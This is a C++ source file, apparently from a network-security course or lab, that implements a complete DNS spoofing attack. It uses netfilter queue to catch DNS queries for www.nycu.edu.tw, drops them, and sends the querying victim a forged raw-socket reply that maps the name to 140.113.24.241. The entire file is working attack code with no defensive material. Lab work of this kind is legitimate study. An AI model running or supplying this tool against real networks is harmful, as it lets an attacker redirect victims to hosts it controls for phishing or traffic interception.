#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

using namespace std;

#define SPOOFED_IP "140.113.24.241"
#define TARGET_DOMAIN "www.nycu.edu.tw"

int raw_sock;

// 計算 checksum（IP, UDP 都會用到）
uint16_t checksum(uint16_t* data, int len) {
    unsigned long sum = 0;
    for (; len > 1; len -= 2)
        sum += *data++;
    if (len == 1)
        sum += *(uint8_t*)data;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

// 解析 DNS 查詢 domain name
string parse_domain(unsigned char* data, int offset) {
    string domain;
    while (data[offset] != 0) {
        int len = data[offset++];
        for (int i = 0; i < len; ++i)
            domain += data[offset++];
        domain += '.';
    }
    if (!domain.empty()) domain.pop_back();
    return domain;
}

// 建構並發送 spoofed DNS 回應
void send_fake_response(unsigned char* original, int len) {
    struct iphdr* iph = (struct iphdr*)original;
    int iphdr_len = iph->ihl * 4;
    struct udphdr* udph = (struct udphdr*)(original + iphdr_len);
    unsigned char* dns = original + iphdr_len + sizeof(struct udphdr);

    int dns_query_len = len - iphdr_len - sizeof(struct udphdr);
    int domain_len = strlen((const char*)dns + 12) + 2;  // domain 結尾有 0x00
    int response_len = domain_len + 16; // 回應部分固定長度（NAME + TYPE + CLASS + TTL + RDLENGTH + RDATA）

    int dns_total_len = dns_query_len + response_len;
    int udp_total_len = sizeof(struct udphdr) + dns_total_len;
    int ip_total_len = sizeof(struct iphdr) + udp_total_len;

    unsigned char buffer[1500];
    memset(buffer, 0, sizeof(buffer));

    // IP header
    struct iphdr* new_iph = (struct iphdr*)buffer;
    new_iph->version = 4;
    new_iph->ihl = 5;
    new_iph->tos = 0;
    new_iph->tot_len = htons(ip_total_len);
    new_iph->id = htons(0);
    new_iph->frag_off = 0;
    new_iph->ttl = 64;
    new_iph->protocol = IPPROTO_UDP;
    new_iph->saddr = iph->daddr;
    new_iph->daddr = iph->saddr;
    new_iph->check = checksum((uint16_t*)new_iph, sizeof(struct iphdr));

    // UDP header
    struct udphdr* new_udph = (struct udphdr*)(buffer + sizeof(struct iphdr));
    new_udph->source = udph->dest;
    new_udph->dest = udph->source;
    new_udph->len = htons(udp_total_len);
    new_udph->check = 0; // optional

    // DNS 回應
    unsigned char* dns_resp = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);
    memcpy(dns_resp, dns, dns_query_len); // 複製原始 query

    dns_resp[2] = 0x81; // Flags: response + recursion available
    dns_resp[3] = 0x80;
    dns_resp[7] = 0x01; // Answer RRs = 1

    int offset = dns_query_len;

    // 回應 NAME：使用 pointer 到 query 的 offset 0x0c（12）
    dns_resp[offset++] = 0xc0;
    dns_resp[offset++] = 0x0c;

    // TYPE = A
    dns_resp[offset++] = 0x00;
    dns_resp[offset++] = 0x01;

    // CLASS = IN
    dns_resp[offset++] = 0x00;
    dns_resp[offset++] = 0x01;

    // TTL
    dns_resp[offset++] = 0x00;
    dns_resp[offset++] = 0x00;
    dns_resp[offset++] = 0x00;
    dns_resp[offset++] = 0x3c; // 60 秒

    // RDLENGTH
    dns_resp[offset++] = 0x00;
    dns_resp[offset++] = 0x04;

    // RDATA：spoofed IP
    in_addr spoofed_addr;
    inet_aton(SPOOFED_IP, &spoofed_addr);
    memcpy(&dns_resp[offset], &spoofed_addr.s_addr, 4);
    offset += 4;

    // 發送封包
    struct sockaddr_in to{};
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = new_iph->daddr;

    if (sendto(raw_sock, buffer, ip_total_len, 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
        perror("sendto");
    } else {
        cout << "[>] Sent spoofed DNS reply to victim." << endl;
    }
}


// nfqueue callback
static int cb(struct nfq_q_handle* qh, struct nfgenmsg*, struct nfq_data* nfa, void*) {
    unsigned char* data;
    int len = nfq_get_payload(nfa, &data);
    if (len < 0) return nfq_set_verdict(qh, 0, NF_ACCEPT, 0, nullptr);

    struct iphdr* iph = (struct iphdr*)data;
    if (iph->protocol != IPPROTO_UDP) return nfq_set_verdict(qh, 0, NF_ACCEPT, 0, nullptr);

    int iphdr_len = iph->ihl * 4;
    struct udphdr* udph = (struct udphdr*)(data + iphdr_len);
    if (ntohs(udph->dest) != 53) return nfq_set_verdict(qh, 0, NF_ACCEPT, 0, nullptr);

    unsigned char* dns = data + iphdr_len + sizeof(struct udphdr);
    string domain = parse_domain(dns, 12);
    cout << "[*] DNS request for domain: " << domain << endl;

    if (domain == TARGET_DOMAIN) {
        cout << "[+] DNS spoofing: " << domain << " → " << SPOOFED_IP << endl;
        send_fake_response(data, len);
        return nfq_set_verdict(qh, ntohl(nfq_get_msg_packet_hdr(nfa)->packet_id), NF_DROP, 0, nullptr);
    }

    return nfq_set_verdict(qh, ntohl(nfq_get_msg_packet_hdr(nfa)->packet_id), NF_ACCEPT, 0, nullptr);
}

int main() {
    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        perror("socket");
        return 1;
    }

    struct nfq_handle* h = nfq_open();
    nfq_unbind_pf(h, AF_INET);
    nfq_bind_pf(h, AF_INET);
    struct nfq_q_handle* qh = nfq_create_queue(h, 0, &cb, nullptr);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    int fd = nfq_fd(h);
    char buf[4096] __attribute__((aligned(4)));

    while (true) {
        int rv = recv(fd, buf, sizeof(buf), 0);
        if (rv >= 0) nfq_handle_packet(h, buf, rv);
    }

    nfq_destroy_queue(qh);
    nfq_close(h);
    close(raw_sock);

    return 0;
}
